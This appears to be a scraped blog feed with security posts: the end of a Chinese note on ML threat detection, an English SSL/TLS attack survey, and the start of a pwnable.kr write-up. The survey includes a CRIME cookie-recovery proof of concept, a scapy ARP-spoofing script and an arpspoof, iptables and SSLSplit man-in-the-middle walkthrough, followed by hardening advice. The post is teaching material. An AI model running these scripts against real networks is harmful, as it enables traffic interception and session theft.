title="策略选择"></a>策略选择</h4><p>白名单策略：找到正常行为——建立pattern（模式）——滤出异常</p><ul><li>业务改变时，需要重新进行聚类</li><li>无监督聚类的效果还没有达到有监督的好，容易尝试误报</li></ul><p>黑名单策略：原始日志或异常——分类器——识别威胁</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200425001353.png"></p><p>图：常用的两种策略</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="两个角度"><a href="#两个角度" class="headerlink" title="两个角度"></a>两个角度</h3><p>对抗：对深度学习的逃逸攻击</p><p>防护：HTTP恶意外连流量的机器学习检测</p><h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p>对深度学习的逃逸攻击</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200425003527.png"></p><p>参考：<a href="https://blogs.360.cn/post/evasion-attacks-on-ai-system.html" target="_blank" rel="noopener">https://blogs.360.cn/post/evasion-attacks-on-ai-system.html</a></p><h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><p>HTTP恶意外连流量的机器学习检测</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200425003457.png"></p><p>图：论文概要和笔记</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200425003750.png"></p><p>图：控制协议模板的生成</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200425003937.png"></p><p>图：主要的流程示意图</p><p>泛化其实就是用来进行数据降维的一种方式</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200425004008.png"></p><p>图：上图的泛化部分示意</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] 【每周分享】数据驱动安全入门概览，Nepnep战队，<a href="https://www.bilibili.com/video/BV1ye411W7xn" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1ye411W7xn</a></p><p>[2] 数据驱动安全怎么做, <a href="https://c4pr1c3.github.io/cuc-ns/ds-security/how.html" target="_blank" rel="noopener">https://c4pr1c3.github.io/cuc-ns/ds-security/how.html</a></p>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Security Research for SSL/TLS</title>
      <link href="/2020/05/28/security/Security-Research-for-SSL-TLS/"/>
      <url>/2020/05/28/security/Security-Research-for-SSL-TLS/</url>
      
        <content type="html"><![CDATA[<h1 id="Security-Research-for-SSL-TLS"><a href="#Security-Research-for-SSL-TLS" class="headerlink" title="Security Research for SSL/TLS"></a>Security Research for SSL/TLS</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>This article is a security study of SSL/TLS, involving HTTPS hijacking and traffic sniffing. This article summarizes the attack methods that can now be used for SSL/TLS decryption, as well as the methods used for HTTPS hijacking. It also provides a case of man-in-the-middle attack. Finally, several suggestions are made to enhance the security of SSL/TLS and HTTPS.</p><h2 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h2><p>SSL/TLS, HTTPS Hijacking, HTTPS Security</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>There may be security issues such as information stealing or identity disguise in the HTTP protocol. Using the HTTPS communication mechanism can effectively prevent these problems.<br>But HTTPS is not a new protocol for the application layer, it is just a part of the HTTP communication interface replaced by SSL and TLS protocols.<br>Therefore, the security research of HTTPS is largely the research of SSL/TLS protocol.<br>With the popularity of HTTPS, a number of new ways of attacking HTTPS are emerging, and security issues ranging from individuals to countries are being discussed.<br>In this article, we will introduce the attack methods against HTTPS, add actual cases, and put forward some protection Suggestions.</p><h2 id="The-Principle-of-SSL-TLS"><a href="#The-Principle-of-SSL-TLS" class="headerlink" title="The Principle of SSL/TLS"></a>The Principle of SSL/TLS</h2><p>The main function of the HTTPS protocol is largely dependent on the  SSL/TLS protocol, the realization of the function of the  SSL/TLS rely mainly on the three kinds of basic algorithms: hash function, symmetric encryption and asymmetric encryption, <strong>the identity authentication and key agreement by using asymmetric encryption, symmetric encryption algorithm using the key agreement for data encryption, verify the integrity of information based on hash function</strong>.[1]</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527142803.png"></p><p>Fig. Diagram of how SSL/TLS works</p><p>HTTPS use a hybrid encryption mechanism that uses oth symmetric and asymmetric encryption.</p><p>The specific method is as follows: the party sending the ciphertext uses the public key of the other party to encrypt the “symmetric key”, and then the other party decrypts the “symmetric key” with its private key, so as to ensure that the exchanged key is safe, and then uses the symmetric encryption method to communicate.</p><p>In order to further guarantee the integrity of data transmission process, digital signature verification is added.</p><p>The receiver can decrypt the encrypted digest message only with the sender’s public key, and then use the HASH function to generate a digest message for the received text, compared with the digest message obtained in the previous step.If it is the same, it means that the received information is complete and has not been modified during transmission, otherwise it means that the information has been modified, so the digital signature can verify the integrity of the information.[1]</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527143729.png" style="zoom:50%;" /><p>Fig. Message Digest in Information security[2]</p><p>From the figure above, we can see how the message digest works, but one of the most important questions is: How to prove that the public key came from the real sender?</p><p>So, the certificate authority(CA) is required to prove the ownership of the public key.</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527144702.png" style="zoom: 80%;" /><p>Fig. Diagram of the certificate authority[3]</p><h2 id="Vulnerability-Attack-Techniques-for-SSL-TLS"><a href="#Vulnerability-Attack-Techniques-for-SSL-TLS" class="headerlink" title="Vulnerability Attack Techniques for SSL/TLS"></a>Vulnerability Attack Techniques for SSL/TLS</h2><p>Next section will describes some ways to attack SSL/TLS vulnerabilities.</p><h3 id="Man-in-the-Middle-Attack"><a href="#Man-in-the-Middle-Attack" class="headerlink" title="Man-in-the-Middle Attack"></a>Man-in-the-Middle Attack</h3><p>MITM (Man - in - the - Middle Attack), is refers to the ends of the attacker and communications create a separate connection respectively, and the exchange of all its received data, make communication both sides of the think that they are connected via a private talk directly with each other, but in fact the entire conversation is completely controlled by the attacker.</p><p>In the middle attack, an attacker can intercept the communication on both sides of the end even insert the new content. </p><p>A man-in-the-middle attack can succeed only if the attacker can disguise himself as the terminal of each participating session without being detected by other terminals.</p><h3 id="Downgrade-Attack"><a href="#Downgrade-Attack" class="headerlink" title="Downgrade Attack"></a>Downgrade Attack</h3><p>Downgrade Attack, is an attack on a computer system or communication protocol. In a downgrade attack, the attacker deliberately makes the system give up the new, high-security working mode and use the old, low-security working mode prepared for backward compatibility.</p><p>Degradation attacks are often used as man-in-the-middle attacks to weaken the security of encrypted communication protocols.[4]</p><h3 id="BEAST-Attack"><a href="#BEAST-Attack" class="headerlink" title="BEAST Attack"></a>BEAST Attack</h3><p>The BEAST attack exploits a vulnerability in the way the TLS 1.0 protocol generates initialization vectors for block cipher in CBC mode (cve-2011-3389).<br>Combined with clever manipulation of block boundaries, this vulnerability allows a man-in-the-middle attacker to sniff out encrypted traffic without having to perform any decryption to find a small amount of information and exploit the vulnerability regardless of the type and strength of the block password.</p><h3 id="Heartbleed-Attack"><a href="#Heartbleed-Attack" class="headerlink" title="Heartbleed Attack"></a>Heartbleed Attack</h3><p>The Heartbleed Bug(CVE-2014-0160) is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet.</p><p>The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.[5]</p><h3 id="HEIST-Attack"><a href="#HEIST-Attack" class="headerlink" title="HEIST Attack"></a>HEIST Attack</h3><p>HEIST(Encrypted Information can be Stolen through TCP-Windows) takes advantage of the fact that HTTPS responses depend on TCP.<br>Once the attacker knows the size of the encrypted response data, he can optionally extract the plaintext information contained in the data using one of two previously designed vulnerabilities.</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200527162341.png"></p><p>Fig. A demo show how the HEIST attack[6]</p><h3 id="CRIME-Attack"><a href="#CRIME-Attack" class="headerlink" title="CRIME Attack"></a>CRIME Attack</h3><p>The CIME attack works by running JavaScript code in the victim’s browser, listening for HTTPS data through a middleman component, and decrypting session cookies by looking for differences in the cipher text for each cracked request and response.</p><p>Next is the POC(Proof Of Concept) of CRIME attack[7].</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">charset = string.letters + string.digits + <span class="string">"%/+="</span></span><br><span class="line"></span><br><span class="line">COOKIE = <span class="string">''</span>.join(random.choice(charset) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">HEADERS = (<span class="string">"POST / HTTP/1.1\r\n"</span></span><br><span class="line">       <span class="string">"Host: thebankserver.com\r\n"</span></span><br><span class="line">           <span class="string">"Connection: keep-alive\r\n"</span></span><br><span class="line">           <span class="string">"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"</span></span><br><span class="line">           <span class="string">"Accept: */*\r\n"</span></span><br><span class="line">           <span class="string">"Referer: https://thebankserver.com/\r\n"</span></span><br><span class="line">           <span class="string">"Cookie: secret="</span> + COOKIE +  <span class="string">"\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Encoding: gzip,deflate,sdch\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Language: en-US,en;q=0.8\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"</span></span><br><span class="line">           <span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">BODY = (<span class="string">"POST / HTTP/1.1\r\n"</span></span><br><span class="line">           <span class="string">"Host: thebankserver.com\r\n"</span></span><br><span class="line">           <span class="string">"Connection: keep-alive\r\n"</span></span><br><span class="line">           <span class="string">"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"</span></span><br><span class="line">           <span class="string">"Accept: */*\r\n"</span></span><br><span class="line">           <span class="string">"Referer: https://thebankserver.com/\r\n"</span></span><br><span class="line">           <span class="string">"Cookie: secret="</span></span><br><span class="line">         )</span><br><span class="line"></span><br><span class="line">BODY_SUFFIX=(<span class="string">"\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Encoding: gzip,deflate,sdch\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Language: en-US,en;q=0.8\r\n"</span></span><br><span class="line">           <span class="string">"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"</span></span><br><span class="line">           <span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compress</span><span class="params">(data)</span>:</span></span><br><span class="line"></span><br><span class="line">    c = zlib.compressobj()</span><br><span class="line">    <span class="keyword">return</span> c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findnext</span><span class="params">(b,bs,charset)</span>:</span></span><br><span class="line">    <span class="comment">#print "body len",len(b)</span></span><br><span class="line">    baselen = len(compress(HEADERS +</span><br><span class="line">                      b +</span><br><span class="line">                      bs))</span><br><span class="line"></span><br><span class="line">    possible_chars = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        length = len(compress(HEADERS +</span><br><span class="line">                      b +</span><br><span class="line">                      c +</span><br><span class="line">                      bs))</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print repr(c), length, baselen</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> length &lt;= baselen:</span><br><span class="line">            possible_chars.append(c)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print '=', possible_chars</span></span><br><span class="line">    <span class="keyword">return</span> possible_chars</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Original cookie: %s"</span> % COOKIE</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Leaked cookie  : %s"</span> % cookie</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cookie</span><br><span class="line">    <span class="keyword">while</span> len(cookie) &lt; len(COOKIE):</span><br><span class="line">        chop = <span class="number">1</span></span><br><span class="line">        possible_chars = findnext(BODY + cookie, <span class="string">""</span>, charset)</span><br><span class="line">        body_tmp = BODY</span><br><span class="line">        orig = possible_chars</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> len(possible_chars) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> len(body_tmp) &lt; chop:</span><br><span class="line">                <span class="comment">#print "stuck at", possible_chars</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            body_tmp = body_tmp[chop:]</span><br><span class="line">            possible_chars = findnext(body_tmp + cookie, <span class="string">""</span>, orig)</span><br><span class="line"></span><br><span class="line">        cookie = cookie + possible_chars[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> BODY.find(<span class="string">"\r\n"</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> forward():</span><br><span class="line">        cookie = cookie[:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(cookie) &gt;= len(COOKIE):</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"reducing body"</span></span><br><span class="line">    BODY = BODY[BODY.find(<span class="string">"\r\n"</span>) + <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><h2 id="Case-Analysis-and-Actual-Combat"><a href="#Case-Analysis-and-Actual-Combat" class="headerlink" title="Case Analysis and Actual Combat"></a>Case Analysis and Actual Combat</h2><p>Next, we’ll use the SSLSplit tool for the MITM attack, which is shown in the attachment.</p><h3 id="1-Prepare"><a href="#1-Prepare" class="headerlink" title="(1) Prepare"></a>(1) Prepare</h3><p>Next, we shoule git clone the tools “SSLSplit”  source, compile and install</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/droe/sslsplit.git /opt/sslsplit</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install libssl-dev libevent-dev</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><h3 id="2-Data-traffic-redirection"><a href="#2-Data-traffic-redirection" class="headerlink" title="(2) Data traffic redirection"></a>(2) Data traffic redirection</h3><p>Here we use the classic ARP attack to redirect network data.<br>The following is an example of a Python implementation of ARP attacks. Of course, you can also use tools such as <code>arpspoof</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> ARP,send</span><br><span class="line"><span class="keyword">import</span> os,re,sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gateway_ip</span><span class="params">()</span>:</span></span><br><span class="line">    t=os.popen(<span class="string">'route -n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        <span class="keyword">if</span> i.startswith(<span class="string">'0.0.0.0'</span>):</span><br><span class="line">            r=re.split(<span class="string">"\s+"</span>,i)</span><br><span class="line">            <span class="keyword">return</span> r[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gateway_hw</span><span class="params">(ip)</span>:</span></span><br><span class="line">    t=os.popen(<span class="string">'arp -e %s'</span> % ip)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">        <span class="keyword">if</span> i.startswith(ip):</span><br><span class="line">            r=re.split(<span class="string">"\s+"</span>,i)</span><br><span class="line">            <span class="keyword">return</span> r[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(hackip)</span>:</span></span><br><span class="line">    ip=get_gateway_ip()</span><br><span class="line">    hw=get_gateway_hw(ip)</span><br><span class="line">    arp=ARP(op=<span class="number">2</span>,pdst=ip,hwdst=hw,psrc=hackip)</span><br><span class="line">    <span class="comment">#os.popen('ifconfig eth0 %s' % hackip )</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        send(arp)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"USEAGE: sudo python arp_dos.py 192.168.X.XXX"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        help()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hack(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="3-MITM"><a href="#3-MITM" class="headerlink" title="(3) MITM"></a>(3) MITM</h3><p>Next, we start to launch a man-in-the-middle attack, where, for experimental purposes, we use OpenSSL to generate a certificate</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openssl genrsa -out ca.key 2048</span><br><span class="line">$ openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure><p>Then, we should forward port traffic on the testing machine by the <code>iptables</code> command</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Open the function of ip_forward if neccessary</span></span><br><span class="line">$ <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="comment"># Clear the original setting</span></span><br><span class="line">$ iptables -t nat -L</span><br><span class="line">$ iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">$ iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br></pre></td></tr></table></figure><p>Here, we use the ARP Spoffing tool for ARP spoofing</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ arpspoof -i eth0 -t 192.168.X.XXX -r 192.168.X.XXX</span><br></pre></td></tr></table></figure><p>Finally, we launch the SSLSplit command for the attack</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure><h3 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="(4) Conclusion"></a>(4) Conclusion</h3><p>In this example, we have implemented one of the most “traditional”, easiest examples of certificate spoofing implementing man-in-the-middle attacks.<br>In reality, due to the update of SSL/TLS protocol and the protection of browser and operating system, this attack method has been almost impossible to realize. However, this part of the article is mainly to provide an implementation idea for reference, showing that this attack method is actually cheaper.</p><h2 id="Protection-Recommendations"><a href="#Protection-Recommendations" class="headerlink" title="Protection Recommendations"></a>Protection Recommendations</h2><p>This section is divided into recommendations for protecting against malicious SSL/TLS attacks.</p><h3 id="Choose-a-good-certificate-authority"><a href="#Choose-a-good-certificate-authority" class="headerlink" title="Choose a good certificate authority"></a>Choose a good certificate authority</h3><p>Here are some reference factors for choosing CA</p><ul><li>Large market share</li><li>Clear business focus</li><li>Provide multiple recall mechanisms and a high performance OCSP service.<br>The CA at least provides domain name authentication and extended certificate authentication, ideally allowing you to select your own public key.<br>[8]</li><li>Have good certificate management tools</li><li>Provide good technical support</li></ul><h3 id="Select-the-strong-algorithm-signature-certificate"><a href="#Select-the-strong-algorithm-signature-certificate" class="headerlink" title="Select the strong algorithm signature certificate"></a>Select the strong algorithm signature certificate</h3><p>The security of a certificate signature depends on the strength of the signature private key and the strength of the hash function used.[8]<br>So we need to select a certificate with a strong algorithmic signature.</p><h3 id="Use-secure-cipher-suite"><a href="#Use-secure-cipher-suite" class="headerlink" title="Use secure cipher suite"></a>Use secure cipher suite</h3><p>The premise of secure communication is to confirm the authenticity of both parties.<br>In SSL/TLS, the encryption suite determines how you communicate securely.</p><h3 id="Luauch-HSTS-preload"><a href="#Luauch-HSTS-preload" class="headerlink" title="Luauch HSTS preload"></a>Luauch HSTS preload</h3><p>The service should enable HTTP Strict Transport Security (HTTP Strict Transport Security).</p><h3 id="Support-high-level-security-requirements"><a href="#Support-high-level-security-requirements" class="headerlink" title="Support high level security requirements"></a>Support high level security requirements</h3><p>Support high level security requirements such as ATS standards, HSTS, CAA, protection against degraded attacks, forward confidentiality.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] 深入理解HTTPS工作原理, 浪里行舟， <a href="https://juejin.im/post/5ca6a109e51d4544e27e3048" target="_blank" rel="noopener">https://juejin.im/post/5ca6a109e51d4544e27e3048</a></p><p>[2] Message Digest in Information security, GeeksforGeeks, <a href="https://www.geeksforgeeks.org/message-digest-in-information-security/" target="_blank" rel="noopener">https://www.geeksforgeeks.org/message-digest-in-information-security/</a></p><p>[3] What is Certificate Authority (CA)? – Tips to Get SSL Certificate from Certificate Authority, About SSL, <a href="https://aboutssl.org/certificate-authority/" target="_blank" rel="noopener">https://aboutssl.org/certificate-authority/</a></p><p>[4] SSL漏洞总结, Wh0ale, <a href="https://wh0ale.github.io/2018/12/13/2018-12-13-SSL%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/13/2018-12-13-SSL%E6%BC%8F%E6%B4%9E/</a></p><p>[5] The Heartbleed Bug, Synopsys, <a href="https://heartbleed.com/" target="_blank" rel="noopener">https://heartbleed.com/</a></p><p>[6] New attack steals SSNs, e-mail addresses, and more from HTTPS pages, Dan Goodin,  <a href="https://arstechnica.com/information-technology/2016/08/new-attack-steals-ssns-e-mail-addresses-and-more-from-https-pages/" target="_blank" rel="noopener">https://arstechnica.com/information-technology/2016/08/new-attack-steals-ssns-e-mail-addresses-and-more-from-https-pages/</a></p><p>[7] CRIME attack poc, Thomas Pornin, xorninja, <a href="http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/" target="_blank" rel="noopener">http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/</a></p><p>[8] SSL/TLS Deployment Best Practices, Ivan Ristić,  <a href="https://hardenedlinux.github.io/cryptography/2015/07/28/ssl-tls-deployment-1.4.html" target="_blank" rel="noopener">https://hardenedlinux.github.io/cryptography/2015/07/28/ssl-tls-deployment-1.4.html</a></p>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWNABLE学习笔记【updating】</title>
      <link href="/2020/03/28/PWNABLE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/28/PWNABLE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PWNABLE学习笔记-updating"><a href="#PWNABLE学习笔记-updating" class="headerlink" title="PWNABLE学习笔记 [updating]"></a>PWNABLE学习笔记 [updating]</h1><p>这是我学习system exploit时, 在pwnable上做题的一个记录, 感谢这个平台提供的练习, 帮助我入门学习。</p><p>PWNABLE：<a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">Link</a></p><p>WriteUp(14 challenges): <a href="https://research.checkpoint.com/wp-content/uploads/2020/03/pwnable_writeup.pdf" target="_blank" rel="noopener">Link</a></p><h2 id="Challenge-1-fd"><a href="#Challenge-1-fd" class="headerlink" title="Challenge 1: [fd]"></a>Challenge 1: [fd]</h2><p>题目文件：文件fd.c , 文件fd（fd.c编译后的可执行二进制文件）, 文件flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span 